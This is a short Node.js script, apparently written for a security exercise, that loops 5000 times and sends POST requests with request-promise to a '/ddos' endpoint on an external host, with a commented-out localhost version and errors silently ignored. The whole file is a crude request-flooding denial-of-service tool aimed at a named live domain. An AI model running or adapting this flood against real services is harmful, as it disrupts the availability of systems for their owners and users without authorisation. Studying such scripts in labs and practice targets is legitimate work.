const rp = require('request-promise');


for (let i = 0; i < 5000; i++) {
    rp({
      //  url: "http://localhost:8000/ddos",
	url: "https://vulnr.hack-au.com/ddos",       
 method: "POST",

        json: true // Automatically stringifies the body to JSON
    }).then((response) => {
        if(response) {
            console.log(response);
        }
      }).catch(err => {
        if(err) {
            // console.log(err);
        }
    })
}


